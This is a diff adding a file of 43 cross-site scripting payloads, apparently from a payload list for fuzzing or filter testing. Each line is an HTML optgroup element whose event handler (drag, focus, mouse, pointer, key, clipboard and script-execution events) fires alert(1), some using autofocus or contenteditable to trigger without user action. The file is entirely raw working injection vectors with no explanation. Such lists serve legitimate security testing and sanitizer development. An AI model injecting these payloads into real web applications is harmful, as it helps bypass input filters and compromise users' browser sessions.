@@ -1,0 +1,43 @@
+<optgroup draggable="true" ondrag="alert(1)">test</optgroup>
+<optgroup draggable="true" ondragend="alert(1)">test</optgroup>
+<optgroup draggable="true" ondragenter="alert(1)">test</optgroup>
+<optgroup draggable="true" ondragleave="alert(1)">test</optgroup>
+<optgroup draggable="true" ondragstart="alert(1)">test</optgroup>
+<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>
+<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>
+<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>
+<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>
+<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
+<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
+<optgroup onafterscriptexecute=alert(1)><script>1</script>
+<optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
+<optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
+<optgroup onbeforepaste="alert(1)" contenteditable>test</optgroup>
+<optgroup onbeforescriptexecute=alert(1)><script>1</script>
+<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>
+<optgroup onclick="alert(1)">test</optgroup>
+<optgroup oncontextmenu="alert(1)">test</optgroup>
+<optgroup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<optgroup oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<optgroup ondblclick="alert(1)" autofocus tabindex=1>test</optgroup>
+<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>
+<optgroup onkeydown="alert(1)" contenteditable>test</optgroup>
+<optgroup onkeypress="alert(1)" contenteditable>test</optgroup>
+<optgroup onkeyup="alert(1)" contenteditable>test</optgroup>
+<optgroup onmousedown="alert(1)">test</optgroup>
+<optgroup onmouseenter="alert(1)">test</optgroup>
+<optgroup onmouseleave="alert(1)">test</optgroup>
+<optgroup onmousemove="alert(1)">test</optgroup>
+<optgroup onmouseout="alert(1)">test</optgroup>
+<optgroup onmouseover="alert(1)">test</optgroup>
+<optgroup onmouseup="alert(1)">test</optgroup>
+<optgroup onmousewheel=alert(1)>requires scrolling
+<optgroup onpaste="alert(1)" contenteditable>test</optgroup>
+<optgroup onpointerdown=alert(1)>XSS</optgroup>
+<optgroup onpointerenter=alert(1)>XSS</optgroup>
+<optgroup onpointerleave=alert(1)>XSS</optgroup>
+<optgroup onpointermove=alert(1)>XSS</optgroup>
+<optgroup onpointerout=alert(1)>XSS</optgroup>
+<optgroup onpointerover=alert(1)>XSS</optgroup>
+<optgroup onpointerrawupdate=alert(1)>XSS</optgroup>
+<optgroup onpointerup=alert(1)>XSS</optgroup>
